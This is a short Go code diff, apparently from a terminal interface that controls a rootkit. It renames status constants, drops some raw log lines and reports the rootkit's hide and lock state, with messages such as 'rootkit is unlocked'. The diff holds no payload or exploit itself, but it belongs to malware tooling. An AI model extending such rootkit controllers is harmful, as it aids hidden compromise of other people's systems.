@@ -26,6 +26,11 @@ type (
 	LockDoneCmd  int
 )
 
+const (
+	HOOKS_DISABLED = '0'
+	HOOKS_ENABLED  = '1'
+)
+
 func NewHideModel(cfg TabCfg, isHidden *bool) *HideModel {
 	b := false
 	h := HideModel{
@@ -122,15 +127,14 @@ loop:
 		select {
 		case msg, ok := <-ch:
 			if ok {
-				h.logs.Append(msg)
 				l := msg[0]
 				switch l {
-				case '0':
+				case HOOKS_DISABLED:
 					*h.isHidden = false
-				case '1':
+				case HOOKS_ENABLED:
 					*h.isHidden = true
 				default:
-					h.logs.Append("hide: couldn't determine lock status\n")
+					h.logs.Append(fmt.Sprintf("hide: couldn't determine hide status: %v\n", msg))
 				}
 			} else {
 				h.logs.Append("hide not ok\n")
@@ -174,13 +178,12 @@ loop:
 		select {
 		case msg, ok := <-ch:
 			if ok {
-				h.logs.Append(msg)
 				l := msg[0]
 				switch l {
-				case '0':
+				case UNLOCKED:
 					*h.locked = false
 					h.logs.Append("lock: rootkit is unlocked! 🔓\n")
-				case '1':
+				case LOCKED:
 					*h.locked = true
 					h.logs.Append("lock: rootkit is locked 🔒\n")
 				default:
